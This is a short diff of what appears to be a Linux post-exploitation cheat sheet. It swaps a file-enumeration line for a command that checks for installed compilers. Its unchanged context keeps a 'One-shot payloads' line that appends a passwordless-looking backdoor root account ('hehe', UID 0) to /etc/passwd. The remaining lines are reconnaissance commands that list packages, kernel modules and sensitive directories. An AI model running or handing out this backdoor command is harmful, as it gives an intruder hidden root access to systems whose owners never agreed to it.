@@ -52,11 +52,11 @@ dpkg -l
 lsmod
 /sbin/modinfo libata
 
-# File Enumeration
-ll /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
-
 # MySQL,
 mysql --version
+
+# Available compilers
+dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null
 
 # One-shot payloads injects
 echo "hehe:$(openssl passwd LuLZ):0:0:root:/root:/bin/bash" >> /etc/passwd
